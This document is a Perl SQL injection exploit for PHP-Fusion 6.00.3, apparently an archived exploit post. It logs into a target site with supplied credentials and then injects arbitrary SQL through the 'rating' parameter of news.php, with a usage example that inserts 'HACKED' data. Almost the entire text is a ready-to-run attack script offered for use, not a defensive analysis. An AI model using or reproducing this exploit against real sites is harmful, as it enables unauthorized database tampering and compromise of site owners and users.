PHP-Fusion 6.00.3 (rating) Parameter Remote SQL Injection Exploit
=================================================================





#!/usr/bin/perl
#Exploit for PHP-Fusion 6.00.3 Released
#Coded by:krasza
use strict;
use warnings;
use LWP::UserAgent;
use HTTP::Cookies;
if(!$ARGV[3]){
print<<EOF;
Exploit for PHP-Fusion 6.00.3 Released
Coded by krasza


Usage:
perl phpfusion.pl url login pass sql
url-url hack site with [php fusion&#039;s directory]
login-your login
pass-your password
sql-[sql code]
Example:
\t perl phpfusion.pl http://www.something.com/php-fusion admin password 3&#039;,&#039;31337&#039;,&#039;HACKED&#039;)/*
EOF
exit;
}
my $url=shift;
my $login=shift;
my $haslo=shift;
my $sql=shift;
$url=$url."/news.php?readmore=1";
my $ua = new LWP::UserAgent;
$ua->agent("Exploit for PHP-Fusion" . $ua->agent);
$ua->cookie_jar( HTTP::Cookies->new(
&#039;file&#039; => &#039;ciasteczka.txt&#039;,
&#039;autosave&#039; => 1,));
print "[+]Connecting to $url...\n";

my $zadanie = new HTTP::Request POST => $url;
$zadanie->content_type(&#039;application/x-www-form-urlencoded&#039;);
$zadanie->content(&#039;user_name=&#039; . $login . &#039;&user_pass=&#039; . $haslo . &#039;&login=Loguj&#039;
);
my $wynik = $ua->request($zadanie);
if ($wynik->is_success){
print "[+]Connected to $url\n";
#LOGIN JEST PRAWIDLOWE
}else{
print "[-]Connected failed to $url\n";
print "[-]Error:".$wynik->message."\n";
exit;
}
print "[+] Logging In $url...\n";
$zadanie = new HTTP::Request POST => $url;
$zadanie->content_type(&#039;application/x-www-form-urlencoded&#039;);
$zadanie->content(&#039;rating=&#039;.$sql.&#039;&post_rating=Dodaj+ocen%EA&#039;);
my $wynik2 = $ua->request($zadanie);
if ($wynik2->is_success){
print "[+] Sql query isn&#039;t done!\n";
}else{
print "[-]Sql query is done\n";
}



